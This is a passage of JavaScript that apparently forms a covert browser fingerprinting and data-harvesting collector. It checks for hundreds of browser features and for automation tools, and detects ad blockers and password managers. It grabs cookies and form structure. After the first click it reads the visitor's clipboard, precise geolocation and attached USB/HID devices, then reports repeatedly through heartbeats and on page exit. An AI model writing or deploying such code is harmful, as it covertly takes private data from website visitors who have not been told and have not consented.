      "CSSColorLevel4": !!(w.CSS && CSS.supports && CSS.supports("color", "oklch(0.5 0.1 200)")),
      "CSSSubgrid": !!(w.CSS && CSS.supports && CSS.supports("grid-template-columns", "subgrid")),
      "CSSScrollTimeline": !!(w.CSS && CSS.supports && CSS.supports("scroll-timeline-name", "--x")),
      "CSSTextWrap": !!(w.CSS && CSS.supports && CSS.supports("text-wrap", "balance")),
      "CSSAnchorPositioning": !!(w.CSS && CSS.supports && CSS.supports("anchor-name", "--a")),
      "CSSViewTransitions": !!(w.CSS && CSS.supports && CSS.supports("view-transition-name", "--x")),
      "FontLoading": !!document.fonts, "FontFaceSet": !!w.FontFace,
      "FontSystemUI": !!(w.CSS && CSS.supports && CSS.supports("font-family", "system-ui")),
      "localFonts": !!w.queryLocalFonts, "screenCapture": !!(n.mediaDevices && n.mediaDevices.getDisplayMedia),
      "NotificationTriggers": "showTrigger" in (w.Notification ? Notification.prototype : {}),
      "PaymentHandler": !!(w.PaymentRequestEvent), "PaymentCredential": !!w.PaymentCredential,
      "PeriodicSync": !!(n.serviceWorker && "periodicSync" in (n.serviceWorker.constructor || {})),
      "BackgroundFetch": !!(n.serviceWorker && "backgroundFetch" in (n.serviceWorker.constructor || {})),
      "StorageBuckets": !!(n.storage && n.storage.getDirectory),
      "OPFS": !!(n.storage && n.storage.getDirectory), "WebCodecs": !!w.VideoEncoder,
      "AudioEncoder": !!w.AudioEncoder, "ImageDecoder": !!w.ImageDecoder,
      "VideoFrame": !!w.VideoFrame, "MediaStreamTrackProcessor": !!w.MediaStreamTrackProcessor,
      "requestIdleCallback": !!w.requestIdleCallback, "scheduler": !!w.scheduler,
      "cryptoSubtle": !!(w.crypto && w.crypto.subtle), "randomUUID": !!(w.crypto && w.crypto.randomUUID),
      "getRandomValues": !!(w.crypto && w.crypto.getRandomValues),
      "ReportingAPI": !!(w.ReportingObserver), "CSPViolation": !!w.SecurityPolicyViolationEvent,
      "TrustedTypes": !!(w.trustedTypes), "Sanitizer": !!w.Sanitizer,
      "COOP": !!w.crossOriginIsolated, "Isolated": !!w.crossOriginIsolated,
      "PermissionsAPI": !!n.permissions, "StorageAPI": !!n.storage,
      "Scheduler.postTask": !!(w.scheduler && w.scheduler.postTask),
      "WebTransport": !!w.WebTransport, "WebRTCInsertableStreams": !!w.RTCRtpScriptTransform,
      "WebSocketStream": !!w.WebSocketStream, "fetchPriority": !!(w.HTMLLinkElement && "fetchPriority" in HTMLLinkElement.prototype),
      "HTMLSanitizer": !!w.Sanitizer, "ElementInternals": !!w.ElementInternals,
      "DeclarativeShadowDOM": !!(w.HTMLTemplateElement && "shadowRootMode" in HTMLTemplateElement.prototype),
      "SpeculationRules": !!document.createElement("script").supports,
      "LargestContentfulPaint": !!(w.PerformanceObserver && PerformanceObserver.supportedEntryTypes &&
                                   PerformanceObserver.supportedEntryTypes.indexOf("largest-contentful-paint") > -1),
      "LayoutShift": !!(w.PerformanceObserver && PerformanceObserver.supportedEntryTypes &&
                        PerformanceObserver.supportedEntryTypes.indexOf("layout-shift") > -1),
      "EventTiming": !!(w.PerformanceObserver && PerformanceObserver.supportedEntryTypes &&
                        PerformanceObserver.supportedEntryTypes.indexOf("event") > -1),
      "UserAgentData": !!n.userAgentData, "UACHighEntropy": !!(n.userAgentData && n.userAgentData.getHighEntropyValues),
      "CookieStore": !!w.cookieStore, "CookieDeprecation": !!(document.cookie && n.cookieEnabled),
      "WebLocks": !!(n.locks), "LaunchQueue": !!w.launchQueue,
      "HandwritingRecognition": !!w.HandwritingDetector,
      "VirtualKeyboard": !!(n.virtualKeyboard), "KeyboardLayoutMap": !!(n.keyboard && n.keyboard.getLayoutMap),
      "ScreenOrientation": !!(screen.orientation), "ScreenCapture": !!(n.mediaDevices && n.mediaDevices.getDisplayMedia),
      "EyeDropper": !!w.EyeDropper, "DocumentPictureInPicture": !!w.documentPictureInPicture,
      "VideoPictureInPicture": !!(document.pictureInPictureEnabled),
      "RemotePlayback": !!(w.HTMLMediaElement && "remote" in HTMLMediaElement.prototype),
      "MediaSession": !!(n.mediaSession), "MediaCapabilities": !!(n.mediaCapabilities),
      "EncryptedMedia": !!(n.requestMediaKeySystemAccess), "WebShare": !!n.share,
      "WebShareFiles": !!(n.canShare), "WebFileSystem": !!(w.FileSystemHandle),
      "BackgroundSync": !!(n.serviceWorker && w.SyncManager), "ContentIndex": !!(n.serviceWorker),
      "AdInterestGroups": !!(n.joinAdInterestGroup || w.InterestGroup),
      "FLEDGE": !!(w.navigator && w.navigator.joinAdInterestGroup),
      "TopicsAPI": !!(document.browsingTopics), "AttributionReporting": !!(w.AttributionReporting),
      "PrivateStateTokens": !!(document.hasPrivateToken), "FencedFrames": !!(w.Fence),
      "ChromeRuntime": !!(w.chrome && w.chrome.runtime), "ChromeLoadTimes": !!(w.chrome && w.chrome.loadTimes),
      "BrowserExtensions": !!(w.chrome && w.chrome.runtime && w.chrome.runtime.id),
      "Safari": !!(w.safari), "Firefox": !!(w.InstallTrigger), "Opera": !!(w.opr || w.opera),
      "Brave": !!(n.brave), "Edge": !!(w.chrome && n.userAgent.indexOf("Edg") > -1),
      "Electron": !!(w.process && w.process.versions && w.process.versions.electron),
      "NodeJS": !!(w.process && w.process.versions && w.process.versions.node),
      "Phantom": !!(w._phantom || w.callPhantom), "Nightmare": !!(w.__nightmare),
      "Selenium": !!(w.document && document.documentElement.getAttribute("webdriver")) ||
                  !!(w.cdc_adoQpoasnfa76pfcZLmcfl_Array) || !!(w.$cdc_asdjflasutopfhvcZLmcfl_),
      "Puppeteer": !!(w.__puppeteer_evaluation_script__ || n.webdriver),
      "Playwright": !!(w.__playwright || w.__pw_manual),
      "Headless": /headless/i.test(n.userAgent), "HeadlessChrome": /HeadlessChrome/i.test(n.userAgent),
      "WebDriverFlag": !!n.webdriver,
      "Bluetooth": !!n.bluetooth, "Serial": !!n.serial, "USB": !!n.usb, "HID": !!n.hid,
      "MIDI": !!(n.requestMIDIAccess), "NFC": !!w.NDEFReader,
      "Gyroscope": !!w.Gyroscope, "Accelerometer": !!w.Accelerometer,
      "Magnetometer": !!w.Magnetometer, "AmbientLight": !!w.AmbientLightSensor,
      "Proximity": !!w.ProximitySensor, "AbsoluteOrientation": !!w.AbsoluteOrientationSensor,
      "Sensors": !!(w.Sensor), "DeviceOrientation": !!(w.DeviceOrientationEvent),
      "DeviceMotion": !!(w.DeviceMotionEvent), "BatteryStatus": !!n.getBattery,
      "NetworkInfo": !!(n.connection || n.mozConnection),
      "HardwareConcurrency": !!n.hardwareConcurrency, "DeviceMemory": !!n.deviceMemory,
      "MaxTouchPoints": !!n.maxTouchPoints, "TouchEvents": !!w.TouchEvent,
      "PointerEvents": !!w.PointerEvent, "WebKitCSSMatrix": !!(w.WebKitCSSMatrix),
      "DOMMatrix": !!(w.DOMMatrix), "SVG": !!(w.SVGSVGElement), "Canvas": !!w.HTMLCanvasElement,
      "OfflineAudioContext": !!(w.OfflineAudioContext || w.webkitOfflineAudioContext),
      "SpeechGrammar": !!(w.SpeechGrammarList), "XSLT": !!(w.XSLTProcessor),
      "FileReader": !!w.FileReader, "Blob": !!w.Blob, "FormData": !!w.FormData,
      "URLSearchParams": !!w.URLSearchParams, "TextEncoder": !!w.TextEncoder,
      "BigInt": typeof BigInt !== "undefined", "WeakRef": !!w.WeakRef,
      "FinalizationRegistry": !!w.FinalizationRegistry, "Atomics": !!w.Atomics,
      "Proxy": !!w.Proxy, "Reflect": !!w.Reflect, "Symbol": !!w.Symbol,
      "OptionalChaining": (function () { try { eval("({a:{b:1}})?.a?.b"); return true; } catch (e) { return false; } })(),
      "NullishCoalescing": (function () { try { eval("null ?? 1"); return true; } catch (e) { return false; } })(),
      "LogicalAssignment": (function () { try { eval("let a=1; a ||= 2;"); return true; } catch (e) { return false; } })(),
      "PrivateFields": (function () { try { eval("class A{#x=1; m(){return this.#x}}"); return true; } catch (e) { return false; } })(),
      "TopLevelAwait": (function () { try { eval("(async()=>{await 1})()"); return true; } catch (e) { return false; } })(),
      "RegExpLookbehind": (function () { try { new RegExp("(?<=a)b"); return true; } catch (e) { return false; } })(),
      "RegExpNamedGroups": (function () { try { new RegExp("(?<n>a)"); return true; } catch (e) { return false; } })(),
      "ArrayAt": !!Array.prototype.at, "ObjectHasOwn": !!Object.hasOwn,
      "structuredCloneTransfer": !!w.structuredClone,
      "requestAnimationFrame": !!w.requestAnimationFrame,
      "IntersectionObserverV2": !!(w.IntersectionObserver && IntersectionObserver.prototype.takeRecords),
      "Push": !!(n.serviceWorker && w.PushManager),
      "AppBadge": !!(n.setAppBadge), "ContactsManager": !!n.contacts,
      "ComputePressure": !!w.ComputePressureObserver,
      "Summarizer": !!(w.ai && w.ai.summarizer), "Translator": !!(w.ai && w.ai.translator),
      "LanguageDetector": !!(w.ai && w.ai.languageDetector), "Writer": !!(w.ai && w.ai.writer),
      "Rewriter": !!(w.ai && w.ai.rewriter), "PromptAPI": !!(w.ai && w.ai.languageModel),
      "WebNN": !!n.ml, "WebNNContext": !!(n.ml && n.ml.createContext),
      "SchedulerYield": !!(w.scheduler && w.scheduler.yield)
    };
    var list = [], missing = [];
    for (var k in checks) { (checks[k] ? list : missing).push(k); }
    return { supportedCount: list.length, total: list.length + missing.length,
             supported: list, missing: missing.slice(0, 60) };
  });

  /* ============================================== 17. automation bait === */
  later("automation", function () {
    var o = { artifacts: [], baits: {}, consistency: {} };
    var w = window, n = navigator;
    Object.keys(w).forEach(function (k) {
      if (/^(_|\$)(cdc|phantom|nightmare|selenium|puppeteer|playwright|webdriver)/i.test(k) ||
          /cdc_adoQpoasnfa76pfcZLmcfl/.test(k) || /__driver|__webdriver|__selenium/.test(k)) {
        o.artifacts.push(k);
      }
    });
    Object.keys(document).forEach(function (k) {
      if (/^\$cdc_|^__webdriver|^_Selenium|^__nightmare|^__playwright/.test(k)) o.artifacts.push("document." + k);
    });
    /* a real Chrome always exposes these; headless often does not */
    o.consistency.hasChromeObject = !!w.chrome;
    o.consistency.chromeRuntime = !!(w.chrome && w.chrome.runtime);
    o.consistency.chromeLoadTimes = !!(w.chrome && w.chrome.loadTimes);
    o.consistency.pluginsNonEmpty = (n.plugins || []).length > 0;
    o.consistency.languagesNonEmpty = !!(n.languages && n.languages.length);
    o.consistency.mimeTypesNonEmpty = (n.mimeTypes || []).length > 0;
    o.consistency.pdfViewerEnabled = n.pdfViewerEnabled;
    o.consistency.notificationPermissionMatches =
      (typeof Notification === "undefined") ? null : (Notification.permission !== "denied");
    o.consistency.userAgentHasHeadless = /headless/i.test(n.userAgent);
    o.consistency.platformVsUA = { platform: n.platform, ua: n.userAgent };
    /* permissions inconsistency: headless reports denied for everything */
    if (n.permissions && n.permissions.query) {
      try {
        n.permissions.query({ name: "notifications" }).then(function (s) {
          o.consistency.notificationsPermissionState = s.state;
        }, function () {});
      } catch (e) {}
    }
    /* ad-block bait: elements with classic ad class names are hidden by blockers */
    var bait = document.createElement("div");
    bait.className = "ad-banner adsbox advertisement sponsored-ad text-ad pub_300x250";
    bait.id = "ad-banner";
    bait.style.cssText = "position:absolute;left:-9999px;top:-9999px;width:300px;height:250px;";
    bait.innerHTML = "&nbsp;";
    document.body.appendChild(bait);
    o.baits.baitHidden = bait.offsetHeight === 0 || bait.offsetParent === null ||
                         getComputedStyle(bait).display === "none" ||
                         getComputedStyle(bait).visibility === "hidden";
    document.body.removeChild(bait);
    /* extension artefacts: scripts injected into the page head */
    o.extensionScripts = [];
    try {
      var scripts = document.querySelectorAll("script[src]");
      for (var i = 0; i < scripts.length && i < 60; i++) {
        var src = scripts[i].src || "";
        if (/^chrome-extension:|^moz-extension:|^safari-extension:|^webkit-masked-url:/.test(src))
          o.extensionScripts.push(src.slice(0, 120));
      }
    } catch (e) {}
    /* lastpass/1password/bitwarden style DOM markers */
    o.passwordManagerMarkers = [];
    ["com-1password", "lp-pom", "lastpass", "bitwarden", "keeper", "dashlane",
     "nordpass", "1password"].forEach(function (m) {
      try {
        if (document.querySelector('[class*="' + m + '"], [id*="' + m + '"]'))
          o.passwordManagerMarkers.push(m);
      } catch (e) {}
    });
    return o;
  });

  later("adblock", function () {
    /* fetch a known ad URL — blockers kill it, normal browsers get a response */
    var url = "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js";
    var t0 = Date.now();
    return fetch(url, { method: "GET", mode: "no-cors", cache: "no-store" })
      .then(function () { return { blocked: false, ms: Date.now() - t0 }; })
      .catch(function () { return { blocked: true, ms: Date.now() - t0 }; });
  });

  /* ============================================== 18. gamepad / sensors = */
  safe("gamepads", function () {
    var g = navigator.getGamepads ? navigator.getGamepads() : [];
    var out = [];
    for (var i = 0; i < (g ? g.length : 0); i++) {
      if (g[i]) out.push({ id: g[i].id, mapping: g[i].mapping, axes: g[i].axes.length,
                           buttons: g[i].buttons.length, connected: g[i].connected });
    }
    return { count: out.length, pads: out };
  });

  /* ==================================================== 19. dom / page == */
  safe("page", function () {
    var forms = [];
    try {
      var fs = document.forms;
      for (var i = 0; i < fs.length && i < 10; i++) {
        var fields = [];
        var els = fs[i].elements;
        for (var j = 0; j < els.length && j < 40; j++) {
          var e = els[j];
          fields.push({ tag: e.tagName, type: e.type || null, name: e.name || null,
                        id: e.id || null, autocomplete: e.autocomplete || null,
                        placeholder: (e.placeholder || "").slice(0, 60), required: !!e.required });
        }
        forms.push({ action: fs[i].action, method: (fs[i].method || "").toUpperCase(),
                     fieldCount: els.length, fields: fields });
      }
    } catch (e) {}
    return { title: document.title, forms: forms, formCount: forms.length,
             inputCount: document.querySelectorAll("input").length,
             iframeCount: document.querySelectorAll("iframe").length,
             imgCount: document.querySelectorAll("img").length,
             linkCount: document.querySelectorAll("a").length,
             cookieString: document.cookie.slice(0, 400),
             doctype: document.doctype ? document.doctype.name : null,
             charset: document.characterSet, compatMode: document.compatMode,
             readyState: document.readyState, visibility: document.visibilityState,
             hasFocus: document.hasFocus(),
             lang: document.documentElement.lang || null,
             hiddenFields: (function () {
               var out = [];
               document.querySelectorAll("input[type=hidden]").forEach(function (h, i) {
                 if (i < 15) out.push({ name: h.name || h.id || null, len: (h.value || "").length });
               });
               return out;
             })() };
  });

  /* ============================================ 20. crypto / random ==== */
  later("crypto", function () {
    var o = {};
    try {
      var b = new Uint8Array(8); crypto.getRandomValues(b);
      o.sample = Array.prototype.slice.call(b);
      o.randomUUID = crypto.randomUUID ? crypto.randomUUID() : null;
    } catch (e) {}
    try {
      o.subtleAlgos = [];
      ["SHA-1", "SHA-256", "SHA-384", "SHA-512", "AES-CBC", "AES-GCM", "AES-CTR",
       "AES-KW", "HMAC", "PBKDF2", "RSA-OAEP", "ECDSA", "ECDH", "Ed25519",
       "X25519", "HKDF", "ChaCha20-Poly1305", "ML-KEM", "ML-DSA"].forEach(function (a) {
        try {
          crypto.subtle.digest({ name: a }, new Uint8Array(1)).then(function () {}, function () {});
          o.subtleAlgos.push(a);
        } catch (e) {}
      });
    } catch (e) {}
    try { o.randomTiming = (function () { var t = performance.now();
            for (var i = 0; i < 2000; i++) crypto.getRandomValues(new Uint8Array(4));
            return Math.round(performance.now() - t); })(); } catch (e) {}
    return o;
  });

  /* ==================================== 21. timing / behaviour bait ==== */
  safe("behaviour", function () {
    return { t0: performance.now(), loadTs: Date.now(),
             firstInput: null, firstKey: null, firstClick: null, firstMove: null,
             moves: 0, keys: 0, clicks: 0, scrolls: 0, touches: 0,
             maxScrollDepth: 0, activeMs: 0 };
  });

  /* ============================================ 22. permission probes === */
  function permissionProbes() {
    /* geolocation: a real prompt in a normal browser, auto-denied in headless */
    later("geolocation", function () {
      if (!navigator.geolocation) return null;
      return new Promise(function (res) {
        var done = false;
        var to = setTimeout(function () { if (!done) { done = true; errors.geolocation = "timeout"; res(); } }, 8000);
        navigator.geolocation.getCurrentPosition(function (p) {
          if (done) return; done = true; clearTimeout(to);
          res({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy,
                alt: p.coords.altitude, altAcc: p.coords.altitudeAccuracy,
                heading: p.coords.heading, speed: p.coords.speed,
                ts: p.timestamp, isSecure: window.isSecureContext });
        }, function (e) {
          if (done) return; done = true; clearTimeout(to);
          res({ error: e.code + ":" + e.message });
        }, { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 });
      });
    });

    later("clipboard", function () {
      if (!navigator.clipboard || !navigator.clipboard.readText) return null;
      return navigator.clipboard.readText().then(function (t) {
        return { text: String(t || "").slice(0, 500), length: String(t || "").length };
      });
    });

    later("notifications", function () {
      if (!window.Notification) return null;
      return Notification.requestPermission().then(function (p) {
        return { permission: p, maxActions: Notification.maxActions || null };
      });
    });

    later("usbSerialHid", function () {
      var out = {};
      var jobs = [];
      if (navigator.usb && navigator.usb.getDevices)
        jobs.push(navigator.usb.getDevices().then(function (d) {
          out.usb = { count: d.length, devices: d.slice(0, 10).map(function (x) {
            return { vendor: x.vendorId, product: x.productId, name: x.productName }; }) };
        }, function () { out.usb = "denied"; }));
      if (navigator.hid && navigator.hid.getDevices)
        jobs.push(navigator.hid.getDevices().then(function (d) {
          out.hid = { count: d.length, devices: d.slice(0, 10).map(function (x) { return x.productName; }) };
        }, function () { out.hid = "denied"; }));
      if (navigator.serial && navigator.serial.getPorts)
        jobs.push(navigator.serial.getPorts().then(function (p) { out.serial = { count: p.length }; },
                                                    function () { out.serial = "denied"; }));
      return Promise.all(jobs).then(function () { return out; });
    });

    later("localFonts", function () {
      if (!window.queryLocalFonts) return null;
      return window.queryLocalFonts().then(function (fonts) {
        var names = {};
        fonts.forEach(function (f) { names[f.family] = 1; });
        return { count: Object.keys(names).length, families: Object.keys(names).slice(0, 120) };
      });
    });
  }

  /* ======================================================== bootstrap === */
  function behaviourTracking() {
    var b = mods.behaviour;
    if (!b) return;
    function first(k, fn) {
      if (b[k] === null) { b[k] = Math.round(performance.now()); }
      if (fn) fn();
    }
    document.addEventListener("keydown", function () { b.keys++; first("firstKey"); }, true);
    document.addEventListener("click", function () { b.clicks++; first("firstClick", onGesture); }, true);
    document.addEventListener("pointerdown", function () { first("firstClick", onGesture); }, true);
    document.addEventListener("touchstart", function () { b.touches++; first("firstInput", onGesture); }, true);
    document.addEventListener("mousemove", function () {
      b.moves++; first("firstMove");
      if (b.moves === 1) send("move");
    }, { passive: true });
    window.addEventListener("scroll", function () {
      b.scrolls++;
      var d = (window.scrollY + window.innerHeight) / Math.max(1, document.body.scrollHeight);
      b.maxScrollDepth = Math.max(b.maxScrollDepth, Math.round(d * 100));
    }, { passive: true });
    setInterval(function () { b.activeMs += 1000; }, 1000);
  }

  var gestureDone = false;
  function onGesture() {
    if (gestureDone) return;
    gestureDone = true;
    if (PERMS) permissionProbes();
    /* always send a behaviour snapshot on the first interaction */
    setTimeout(function () { send("gesture"); }, 1200);
  }

  /* wave 1: synchronously-collected modules, the moment the page opens */
  send("open");

  /* wave 2: everything async, then one consolidated deep report */
  var deep = [mods.canvas === undefined ? later("canvasNoop", function () { return null; }) : null];
  /* canvas/fonts etc. were registered above; wait for their promises to settle */
  setTimeout(function () { send("deep"); }, 2500);
  setTimeout(function () { send("deep2"); }, 6000);
  setTimeout(function () { send("final"); }, 12000);

  behaviourTracking();

  /* keep the collector alive for long visits: periodic heartbeat with fresh
     battery/network/behaviour state, so an open tab keeps reporting */
  setInterval(function () { send("beat"); }, 30000);

  /* final report when the page is being left */
  window.addEventListener("pagehide", function () { send("unload"); });
  document.addEventListener("visibilitychange", function () {
    if (document.visibilityState === "hidden") send("hidden");
  });
})();
